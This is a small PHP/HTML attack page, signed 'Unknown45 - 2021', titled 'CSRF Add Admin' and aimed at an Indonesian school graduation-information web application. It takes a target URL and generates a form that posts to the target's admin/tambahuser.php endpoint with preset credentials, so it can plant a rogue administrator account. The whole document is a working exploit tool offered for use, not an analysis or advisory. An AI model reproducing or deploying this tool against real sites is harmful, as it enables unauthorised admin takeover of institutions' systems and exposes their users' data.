<html>
<head>
<title>[+] CSRF Add Admin [+]</title>
<meta name="viewport" content="width=device-width, initial-scale=1" /> 
</head>
<script src="https://cdn.jsdelivr.net/npm/pace-js@latest/pace.min.js"></script>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/pace-js@latest/pace-theme-default.min.css">
<body bgcolor="#1e1e1e" text="white">
<style>
  @import url('https://fonts.googleapis.com/css?family=Staatliches');

textarea {
max-width: 90%;
width: 100%;
height: 150px;
resize: none;
outline: none;
overflow: auto;
background: transparent;
color: #ffffff;
}

button {
  background: transparent;
    font-family: Staatliches;
  color: #ffffff;
  border-color: #ffffff;
  cursor: pointer;
}

input {
  max-width: 90%;
  background: transparent;
  font-family: Staatliches;
  color: #ffffff;
  border-color: #ffffff;
  cursor: pointer;
}

font {
  font-family: Staatliches;
}

body::-webkit-scrollbar {
  width: 12px;               /* width of the entire scrollbar */
}

body::-webkit-scrollbar-track {
  background: ##1e1e1e;        /* color of the tracking area */
}

body::-webkit-scrollbar-thumb {
  background-color: ##1e1e1e;    /* color of the scroll thumb */
  border: 3px solid gray;  /* creates padding around scroll thumb */
}
</style>
<center>
<font face=courier new size=5>CSRF Add Admin<br><font size=3>Aplikasi Sistem Informasi Kelulusan<br><hr>
<form method="post">
<input type="text" class="area" name="url" size="55" height="20" placeholder="http://target.co.li/[path]" style="margin: 5px auto; padding-left: 5px;" required><br>
<input type="submit" name="go" class ="asu" value="Lock Target">
</form>
<?php
$url = htmlspecialchars($_POST['url']);
$submit = $_POST['go'];
if($submit) {
    echo "<font><center><i>Target : </i><b>".$url;
    echo "</b><form action='$url/admin/tambahuser.php' method=POST target=_blank><br><i>Nama : <input type=text class=form-control name=nama placeholder=Nama value=unknown45 size=35><br>Username : <input type=text class=form-control name=username placeholder=Username value=abangkece size=35><br>Password : <input type=text class=form-control name=pass placeholder=Password value=buset size=35><br><input type=submit name=submit id=submit value='Add Admin'></form>";
}
?>
<center><hr></i><font size=3>Unknown45 - 2021
